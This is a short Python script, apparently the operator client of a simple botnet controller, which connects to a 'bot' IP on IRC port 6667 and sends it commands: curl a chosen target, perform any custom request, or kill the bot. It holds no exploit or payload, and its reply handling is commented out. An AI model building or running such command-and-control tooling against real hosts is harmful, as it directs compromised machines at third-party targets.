import socket

def get_action(bot):
    action = input("[IRC] Send a simple curl request ('c'), send a custom curl request ('e'), kill the bot ('kill') or exit irc connection('exit'). . . ") 
    if action == 'c':
        target = input("[IRC] Type the target. . . ")
        return f"curl {target}"
    elif action == 'e':
        return input(f"[IRC] Type the request that you want {bot} to perform. . . ")
    elif action == 'exit' or action == 'kill':
        return action
    return ''

def irc_client_program():
    # server info
    bot = input("[IRC] Type the ip of the bot you want to connect to. . . ")
    port = 6667

    # connect to server
    client_socket = socket.socket()
    client_socket.connect((bot, port))
    
    

    while True:
        msg = get_action(bot)
        print("sending ", msg)
        client_socket.send(msg.encode())

        # data = client_socket.recv(1024).decode()
        # print('Received from server: ' + data)
        if msg == 'exit' or msg == 'kill':
            break
    
    client_socket.close()


if __name__ == '__main__':
    irc_client_program()